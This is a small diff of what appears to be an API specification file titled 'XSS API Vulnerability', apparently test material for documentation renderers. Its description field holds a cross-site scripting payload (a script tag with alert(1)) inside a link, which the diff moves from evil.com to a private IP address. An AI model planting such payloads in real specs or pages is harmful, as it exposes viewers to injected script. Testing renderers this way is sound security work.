@@ -4,7 +4,7 @@ info:
   title: XSS API Vulnerability
   description: |
   
-    <a href="https://evil.com"><script>alert(1)</script>Hello</a>
+    <a href="http://192.168.174.131:80/"><script>alert(1)</script>Hello</a>
 
   version: production
 basePath: https://target.com
